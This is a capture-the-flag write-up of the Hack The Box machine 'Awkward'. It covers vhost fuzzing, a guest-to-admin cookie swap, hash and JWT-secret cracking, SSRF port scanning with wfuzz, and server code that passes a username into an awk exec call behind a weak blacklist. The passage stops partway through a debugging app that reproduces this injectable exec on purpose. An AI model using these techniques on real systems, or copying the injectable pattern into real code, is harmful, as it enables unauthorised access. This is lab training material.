<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(HTB) - Awkward" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu)" /><meta property="og:description" content="Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu)" /><link rel="canonical" href="https://an9k0r.github.io/posts/awkward/" /><meta property="og:url" content="https://an9k0r.github.io/posts/awkward/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-03-04T10:33:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(HTB) - Awkward" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Enumeration NMAP 1 2 3 4 5 6 Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.18.0 (Ubuntu)","headline":"(HTB) - Awkward","dateModified":"2023-03-05T12:47:07+01:00","url":"https://an9k0r.github.io/posts/awkward/","datePublished":"2023-03-04T10:33:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/awkward/"},"@context":"https://schema.org"}</script><title>(HTB) - Awkward | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(HTB) - Awkward</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 694 515'%3E%3C/svg%3E" data-src="/assets/images/7f74daeca1ab192640ab21c1ebab31d0afdc9b804ffe6ea12ed54d77e46fa93d.png" class="preview-img bg" alt="image alternative text" width="694" height="515" data-proofer-ignore><h1 data-toc-skip>(HTB) - Awkward</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2023-03-04 10:33:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Sat, Mar 4, 2023, 10:33 AM +0100" >Mar 4</em> </span> <span> Updated <em class="timeago" date="2023-03-05 12:47:07 +0100 " data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 5, 2023, 12:47 PM +0100" >Mar 5</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1847 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="enumeration">Enumeration</h1><h2 id="nmap">NMAP<a href="#nmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>Nmap scan report for 10.129.45.168
Host is up (0.045s latency).
Not shown: 65514 closed tcp ports (conn-refused)
PORT      STATE    SERVICE  VERSION
22/tcp    open     ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     nginx 1.18.0 (Ubuntu)
</pre></table></code></div></div><p>There is nothing much to say here, we have just 2 ports open, so let’s check the webserver on port 80.</p><h2 id="webserver">Webserver<a href="#webserver" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>When browsing to webserver using browser, we’d get redirected to <code class="language-plaintext highlighter-rouge">http://hat-valley.htb</code> so let’s add that to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>. After checking the website, keep proxy open at all times.</p><p><img data-src="/assets/images/a70e21e508a594e635ee354af0c383ae0da73f450ac773fe9e6828258fcc1620.png" alt="picture 2" data-proofer-ignore></p><p>After going to <code class="language-plaintext highlighter-rouge">hat-valley.htb</code></p><h2 id="whatweb">Whatweb<a href="#whatweb" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/05819457efde7628d70adcedb8f061c88f98ba4d1fa5e9a0ef67ffbd5917f6dd.png" alt="picture 3" data-proofer-ignore></p><p>Checking the <code class="language-plaintext highlighter-rouge">Whatweb</code> input, we have nginx/1.18.0, Site is running Express.js, JQuery’s version is 3.0.0</p><h2 id="burp---site-map">Burp - Site Map<a href="#burp---site-map" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>When taking a look at Site map, i’ve noticed certain cookie ==&gt; <code class="language-plaintext highlighter-rouge">token=guest</code>. This is something to make a note of!</p><p><img data-src="/assets/images/deb3ee5812d574dee1a14367a2e5bda1365762d6efe0780ad468b8317effa174.png" alt="picture 6" data-proofer-ignore></p><h2 id="vhost---bruteforce-using-ffuf">VHOST - Bruteforce using FFUF<a href="#vhost---bruteforce-using-ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>┌──(luka㉿yokai)-[~/htb/boxes/awkward]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://hat-valley.htb -H 'Host: FUZZ.hat-valley.htb' --fs 132

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.hat-valley.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 132
________________________________________________

store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 33ms]
</pre></table></code></div></div><p>Let’s add <code class="language-plaintext highlighter-rouge">store.hat-valley.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and check the website.</p><p><img data-src="/assets/images/c95465b7c4118c599d368eec379c2bfbdffbbf8c84dcb40fe8c30efda89f6f4e.png" alt="picture 5" data-proofer-ignore></p><p>We need some credentials, which we don’t have.</p><h2 id="linkfinder">Linkfinder<a href="#linkfinder" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I’ve noticed when i tried to use repeater or simply check the source code of the site, that the webpage would not load as Javascript isn’t running. There is where i thought of <code class="language-plaintext highlighter-rouge">Linkfinder</code> which checks javascripts for links and routes in the Javascript files.</p><p>And it found some interesting pages, indeed.</p><p><img data-src="/assets/images/913c10e3c257c3bae94515dc98aeef530eaadb9777b1105f68d5b2dd042d3525.png" alt="picture 7" data-proofer-ignore></p><p>So we have <code class="language-plaintext highlighter-rouge">hr</code>, <code class="language-plaintext highlighter-rouge">api</code>, <code class="language-plaintext highlighter-rouge">dashboard</code>,…</p><h2 id="finding-hidden-dashboard">Finding hidden dashboard<a href="#finding-hidden-dashboard" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><code class="language-plaintext highlighter-rouge">http://hat-valley.htb/hr</code> presents another login mask.</p><p><img data-src="/assets/images/a075a86d54ee92a67ad638d6e8264efeb67c8091651351f7a60e7902c3a8c271.png" alt="picture 8" data-proofer-ignore></p><p>What if we change the token from guest to <code class="language-plaintext highlighter-rouge">token=admin</code>?</p><p><img data-src="/assets/images/82ed0f116f3d51c7059fb5ae22fe90d8fc1e8c33e1df0142f6b48f9f706c661c.png" alt="picture 9" data-proofer-ignore></p><p>We get in!</p><p>We can try to enter a <code class="language-plaintext highlighter-rouge">Leave</code> but it appears to be a dead end, and requets are ending with <code class="language-plaintext highlighter-rouge">500 Internal Error</code>.</p><h2 id="finding-passwords">Finding passwords<a href="#finding-passwords" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now again in Burp, new site shows up in the <code class="language-plaintext highlighter-rouge">api</code> route</p><p><img data-src="/assets/images/74b0cb707ef134398565fe43863866a0f686c2375a48f3d74fc74187444275d4.png" alt="picture 10" data-proofer-ignore></p><p>It ends with <code class="language-plaintext highlighter-rouge">500 Internal Error</code> but after sending it to Repeater and removing the cookie, the contents were shown</p><p><img data-src="/assets/images/898f8582ee888d6ec9c36a5426a0bf865dc016acf16ee76242c10009a8db1517.png" alt="picture 11" data-proofer-ignore></p><h3 id="decrypting-with-hashcat">Decrypting with Hashcat<a href="#decrypting-with-hashcat" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Throwing the hashlist into hashcat returned 1 password back</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>hashcat hashes /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 1400
.......
Dictionary cache hit:
* Filename..: /Users/cm/Projects/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1:chris123
</pre></table></code></div></div><p>So we have credentials for <code class="language-plaintext highlighter-rouge">christopher.jones:chris123</code>.</p><h2 id="logging-in-to-hr-as-christopherjones">Logging in to HR as christopher.jones<a href="#logging-in-to-hr-as-christopherjones" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/ec5772a960600c05abd587b78e8b20e204ed2fa59b67d9cf02e36565b99a2222.png" alt="picture 12" data-proofer-ignore></p><p>So christopher’s credentials work for HR and we can see below that token was generated.</p><p>Again checking the Burp’s request, this one stands out:</p><p><img data-src="/assets/images/8364c6149f930c4b980e81c542dda420ba719f8cb79bc502bc7d0a30825de8bc.png" alt="picture 14" data-proofer-ignore></p><h1 id="exploiting-server-side-request-forgery-ssrf">Exploiting Server-Side Request Forgery (SSRF)</h1><p>If we change the URL with our own, we can clearly see that we have SSRF vulnerability here.</p><p><img data-src="/assets/images/1004c16abecef9b301ccac52abaa3634648c820f6c72c7beae2d7fcd2b239314.png" alt="picture 13" data-proofer-ignore></p><p>Let’S try to check the open ports on the localhost</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz -c -z range,1-10000 --hh 0 -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2NzI2ODEwfQ.zvrc3itkUEVgwgejeHZpsWGq7fEvz-fPUh5uGuVmI9o" 'http://hat-valley.htb/api/store-status?url="http://localhost:FUZZ/"'
</pre></table></code></div></div><p><img data-src="/assets/images/486d707b3c0cb0da64c606ce65b47a9a2df490b52703287f556d8237f5aeb2a8.png" alt="picture 15" data-proofer-ignore></p><p>This looks promising:</p><p><img data-src="/assets/images/060a6fc3c00ede3bef1d2e4f52ecd8d2134e11cfab0eeb8d11e2509696558edd.png" alt="picture 16" data-proofer-ignore></p><h2 id="reading-the-source-code-on-localhost3002-api">Reading the source code on localhost:3002 (api)<a href="#reading-the-source-code-on-localhost3002-api" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>I opened the response in browser for better readability!</p><p><img data-src="/assets/images/13a1ec840fae29d4ed37d411ad133d6e7dd444874c6bcfdfcc4d55acfdbc60f4.png" alt="picture 17" data-proofer-ignore></p><p>Method that appears interesting and appears to be vulnerable is the <code class="language-plaintext highlighter-rouge">/api/all-leave</code>.</p><p><img data-src="/assets/images/fd229d6b8f1c12818f6d7ac415c46fa160b267480ea5d92127374cfe833c6cd8.png" alt="picture 27" data-proofer-ignore></p><p>User in the token seems to be thrown through Bad-character check, however not all signs appear to be on the blacklist.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>const bad = [";","&amp;","|","&gt;","&lt;","*","?","`","$","(",")","{","}","[","]","!","#"]
...
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) =&gt; {
...
</pre></table></code></div></div><h2 id="crack-that-jwt">Crack that JWT<a href="#crack-that-jwt" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(luka㉿yokai)-[~/htb/boxes/awkward]
└─$ john jwt_enc --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 ASIMD 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123beany123
</pre></table></code></div></div><p>Apparently takes <code class="language-plaintext highlighter-rouge">token</code> parameter JWT or HR user, which makes exploitation easier.</p><p>I’ve written simple program that helped me with debugging. It’s optional and not really needed, but i’d like to mention that ModeJS / ExpressJS app can get running in 15 Minutes or even less.</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookie-parser</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">jsonwebtoken</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">exec</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Hello World!</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/all-leave</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

  <span class="kd">const</span> <span class="nx">user_token</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">token</span>
  <span class="kd">var</span> <span class="nx">authFailed</span> <span class="o">=</span> <span class="kc">false</span>
  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="kc">null</span>
  <span class="kd">var</span> <span class="nx">TOKEN_SECRET</span><span class="o">=</span><span class="dl">"</span><span class="s2">123beany123</span><span class="dl">"</span>

  <span class="k">if</span><span class="p">(</span><span class="nx">user_token</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">decodedToken</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">user_token</span><span class="p">,</span> <span class="nx">TOKEN_SECRET</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">decodedToken</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">authFailed</span> <span class="o">=</span> <span class="kc">true</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
      <span class="nx">user</span> <span class="o">=</span> <span class="nx">decodedToken</span><span class="p">.</span><span class="nx">username</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="nx">authFailed</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="na">Error</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid Token</span><span class="dl">"</span><span class="p">})</span>
  <span class="p">}</span>

  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid user</span><span class="dl">"</span><span class="p">)</span>
  <span class="p">}</span>

  <span class="kd">const</span> <span class="nx">bad</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">;</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">|</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">&gt;</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">&lt;</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">`</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">$</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">(</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">)</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">{</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">}</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">!</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">]</span>
  <span class="kd">const</span> <span class="nx">badInUser</span> <span class="o">=</span> <span class="nx">bad</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">char</span> <span class="o">=&gt;</span> <span class="nx">user</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">char</span><span class="p">));</span>

  <span class="k">if</span><span class="p">(</span><span class="nx">badInUser</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">Bad character detected.</span><span class="dl">"</span><span class="p">)</span>
  <span class="p">}</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">User: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">user</span><span class="p">)</span>
